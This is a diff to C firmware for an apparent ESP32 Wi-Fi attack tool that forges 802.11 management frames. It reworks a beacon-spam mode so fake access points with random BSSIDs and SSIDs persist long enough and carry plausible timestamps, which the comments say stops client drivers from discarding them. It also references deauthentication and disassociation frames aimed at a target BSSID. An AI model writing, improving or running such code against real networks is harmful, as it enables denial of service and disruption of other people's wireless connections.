@@ -11,9 +11,15 @@
 
 static const char *TAG = "svc_deauth";
 
+#define BEACON_DWELL_TICKS 10
+#define BEACON_SSID_MAX    10
+
 static esp_timer_handle_t s_timer = NULL;
 static uint8_t s_bssid[6];        /* target BSSID (deauth/disassoc) */
-static uint8_t s_beacon_bssid[6]; /* per-frame random BSSID (beacon spam) */
+static uint8_t s_beacon_bssid[6]; /* current fake AP BSSID (beacon spam) */
+static char s_beacon_ssid[BEACON_SSID_MAX + 1]; /* current fake AP SSID */
+static int s_beacon_dwell = 0;    /* ticks left on the current fake AP */
+static uint32_t s_beacons = 0;    /* fake APs announced this run */
 static int s_channel = 1;         /* pinned channel, clamped 1..13 */
 static volatile uint32_t s_frames = 0;
 static volatile int s_tx_err = 0;      /* first TX error since start */
@@ -60,31 +66,51 @@ static void build_disassoc(uint8_t *f, const uint8_t bssid[6]) {
     memcpy(f + 16, bssid, 6);
 }
 
-/* Beacon spam: FC 0x80 with a randomized source BSSID and a random
- * printable SSID (1..10 chars) every tick, so nearby scanners see a
- * stream of fake APs. Length is returned for the caller to TX. */
-static int build_beacon(uint8_t *f, uint8_t bssid[6], int channel) {
-    static const char alphabet[] =
-        "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
-    const size_t alen = sizeof(alphabet) - 1;
-    int ssid_len = 1 + (int)(esp_random() % 10); /* 1..10 */
-    for (int i = 0; i < 6; i++)
-        bssid[i] = (uint8_t)esp_random();
+/* Beacon spam: FC 0x80 for one fake AP at a time. The caller (tx_tick)
+ * rotates the fake identity: a random BSSID + random printable SSID
+ * (1..10 chars) held for BEACON_DWELL_TICKS (~1 s), so a client sweeping
+ * the channel actually catches a name instead of seeing ten new ones per
+ * second. Fixed params carry a TSF that starts at a random base and
+ * advances one beacon interval per frame, the way a real AP's clock does:
+ * a fresh random timestamp every frame makes most drivers throw the
+ * beacon away as bogus, which is why only a name or two used to show up
+ * in client scan lists.
+ *
+ * Layout: mgmt hdr (24) | TSF (8) | interval (2) | capability (2) |
+ * SSID tag (2 + len) | DS param set (3). Returns the frame length. */
+static int build_beacon(uint8_t *f, const uint8_t bssid[6], int channel) {
+    static uint32_t tsf = 0;
+    static uint16_t seq = 0;
+    if (tsf == 0) {
+        tsf = esp_random();          /* any plausible starting TSF */
+        if (tsf == 0) {
+            tsf = 0x10000000;
+        }
+    }
+    tsf += 100 * 1024;               /* +100 TU, matching the interval */
+    seq++;
+
+    int ssid_len = (int)strlen(s_beacon_ssid);
+    if (ssid_len < 1) {
+        ssid_len = 1;
+    }
+    if (ssid_len > BEACON_SSID_MAX) {
+        ssid_len = BEACON_SSID_MAX;
+    }
     f[0] = 0x80;                     /* mgmt / beacon */
     f[1] = 0x00;
-    f[2] = 0x00;
+    f[2] = 0x00;                     /* duration: 0 is normal for beacons */
     f[3] = 0x00;
     memset(f + 4, 0xff, 6);          /* addr1: broadcast */
-    memcpy(f + 10, bssid, 6);        /* addr2: source = random BSSID */
+    memcpy(f + 10, bssid, 6);        /* addr2: source = this fake AP */
     memcpy(f + 16, bssid, 6);        /* addr3: BSSID */
-    f[22] = 0x00;                    /* sequence control */
-    f[23] = 0x00;
-    uint32_t ts = (uint32_t)esp_random();
-    f[24] = (uint8_t)(ts & 0xff);
-    f[25] = (uint8_t)((ts >> 8) & 0xff);
-    f[26] = (uint8_t)((ts >> 16) & 0xff);
-    f[27] = (uint8_t)((ts >> 24) & 0xff);
-    f[28] = 0x00;
+    f[22] = (uint8_t)(seq >> 4);     /* sequence control */
+    f[23] = (uint8_t)((seq & 0xf) << 4);
+    f[24] = (uint8_t)(tsf & 0xff);
+    f[25] = (uint8_t)((tsf >> 8) & 0xff);
+    f[26] = (uint8_t)((tsf >> 16) & 0xff);
+    f[27] = (uint8_t)((tsf >> 24) & 0xff);
+    f[28] = 0x00;                    /* upper 4 bytes of the 8-byte TSF */
     f[29] = 0x00;
     f[30] = 0x00;
     f[31] = 0x00;
@@ -94,13 +120,32 @@ static int build_beacon(uint8_t *f, uint8_t bssid[6], int channel) {
     f[35] = 0x04;
     f[36] = 0x00;                    /* SSID tag */
     f[37] = (uint8_t)ssid_len;
-    for (int i = 0; i < ssid_len; i++)
-        f[38 + i] = (uint8_t)alphabet[esp_random() % alen];
+    memcpy(f + 38, s_beacon_ssid, (size_t)ssid_len);
     int o = 38 + ssid_len;
-    f[o++] = 0x03;                   /* DS parameter set */
+    f[o++] = 0x03;                   /* DS parameter set: current channel */
     f[o++] = 0x01;
     f[o++] = (uint8_t)channel;
     return o;
+}
+
+/* Roll a new fake AP identity (random locally-administered BSSID + random
+ * printable SSID) and reset the dwell counter. */
+static void beacon_new_identity(void) {
+    static const char alphabet[] =
+        "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+    const size_t alen = sizeof(alphabet) - 1;
+    for (int i = 0; i < 6; i++)
+        s_beacon_bssid[i] = (uint8_t)esp_random();
+    /* Force the locally-administered bit and clear the multicast bit so the
+     * fake BSSID cannot collide with a real OUI. */
+    s_beacon_bssid[0] |= 0x02;
+    s_beacon_bssid[0] &= (uint8_t)~0x01;
+    int len = 1 + (int)(esp_random() % BEACON_SSID_MAX);
+    for (int i = 0; i < len; i++)
+        s_beacon_ssid[i] = (char)alphabet[esp_random() % alen];
+    s_beacon_ssid[len] = 0;
+    s_beacon_dwell = BEACON_DWELL_TICKS;
+    s_beacons++;
 }
 
 static void tx_tick(void *arg) {
@@ -115,6 +160,10 @@ static void tx_tick(void *arg) {
     for (int i = 0; i < passes; i++) {
         int len = sizeof(f);
         if (s_mode == DEAUTH_MODE_BEACON) {
+            if (s_beacon_dwell <= 0)
+                beacon_new_identity();
+            else
+                s_beacon_dwell--;
             len = build_beacon(f, s_beacon_bssid, s_channel);
         } else {
             build_deauth(f, s_bssid);
@@ -203,6 +252,9 @@ int svc_deauth_start(deauth_mode_t mode) {
     s_tx_errcode = 0;
     s_ticks = 0;
     s_last_err = 0;
+    s_beacons = 0;
+    s_beacon_dwell = 0;
+    s_beacon_ssid[0] = 0;
     s_expired = 0;
     s_fps = 0;
     s_win_frames = 0;
@@ -242,6 +294,14 @@ uint32_t svc_deauth_frames(void) { return s_frames; }
 int svc_deauth_tx_error(void) { return s_tx_errcode; }
 
 uint32_t svc_deauth_ticks(void) { return s_ticks; }
+
+uint32_t svc_deauth_beacons(void) { return s_beacons; }
+
+uint32_t svc_deauth_fake_aps(void) {
+    /* Identities rolled so far, counted as they become visible to clients
+     * (i.e. completed dwell windows, not the one in flight). */
+    return s_beacons > 0 ? s_beacons - 1 : 0;
+}
 
 int svc_deauth_beacon_ok(void) { return s_beacon_ok; }
 
